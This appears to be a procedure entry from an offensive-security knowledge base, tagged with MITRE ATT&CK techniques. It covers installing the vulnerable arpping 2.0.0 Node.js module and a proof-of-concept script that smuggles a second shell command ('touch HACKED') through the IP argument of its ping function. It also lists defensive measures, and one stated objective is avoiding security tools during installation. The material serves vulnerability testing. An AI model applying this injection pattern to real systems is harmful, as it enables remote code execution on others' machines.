---
tags:
  - setup
  - poc
  - node-js
  - arpping
type: procedure
tools:
  - '[[tools/arpping]]'
  - '[[tools/Node.js]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/npm-install]]'
verified: false
platforms:
  - Node.js
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T17:23:23.926Z'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques:
  - '[[Unix Shell]]'
id: e37583d7-fe80-4d4d-aa36-0bd86d9e9e27
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Command-Line Interface]]'
---
# Install-and-Setup-arpping-POC

## Summary

This procedure installs the vulnerable arpping Node.js module (version 2.0.0) and sets up a proof-of-concept script to test command injection in its ping function, preparing the environment for exploitation.

## Description

The arpping module is used for device discovery via ping and ARP, but version 2.0.0 lacks input sanitization in the IP parameter, allowing command injection. This step focuses on installation and script creation in a Node.js environment, assuming local access to a development setup. Prerequisites include Node.js installed and npm available. The outcome is a ready-to-run script that can inject commands like '127.0.0.1;touch HACKED;' to demonstrate RCE.

## Requirements

1. Node.js runtime (version 10+ recommended for compatibility)
2. npm package manager
3. Local file system write access for script and module installation

## Defense

Defensive measures and detection strategies:

- Use dependency scanners like npm audit or Snyk to identify vulnerable packages before installation
- Pin dependencies to patched versions (arpping >2.0.0 if available) and avoid untrusted modules
- Monitor npm install logs for suspicious package versions

## Objectives

1. Install arpping 2.0.0 without triggering security tools
2. Create a POC script for injection testing
3. Verify setup integrity before execution

## Instructions

### Step 1: Install Vulnerable Module

**Context**: Use npm to install the specific vulnerable version of arpping, ensuring the environment is set up for exploitation.

**Command** ([[commands/npm-install]]):
```bash
npm install arpping@2.0.0
```

> This command fetches and installs arpping version 2.0.0 into node_modules. Expected output: Installation progress and 'added 1 package' confirmation. Success if no errors and module is in node_modules/arpping.

### Step 2: Create POC Script

**Context**: Write a Node.js script that requires arpping and calls ping with a malicious IP array to chain commands.

**Command** (Node.js script execution prep):
```javascript
// Save as poc.js
const arpping = require('arpping');
arpping.ping(['127.0.0.1;touch HACKED;'], (err, data) => {
  if (err) console.error(err);
  else console.log(data);
});
```

> No direct command; create the file using a text editor. Expected: Script file saved. Verify with `node -c poc.js` for syntax check (no output if valid).

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Command-Line Interface]] Command and Scripting Interpreter

### Sub-Techniques

- [[Unix Shell]] Unix Shell

## Commands Used

- [[commands/npm-install]]

## Tools Used

- [[tools/arpping]]
- [[tools/Node.js]]

## Tags

- setup
- poc
- node-js
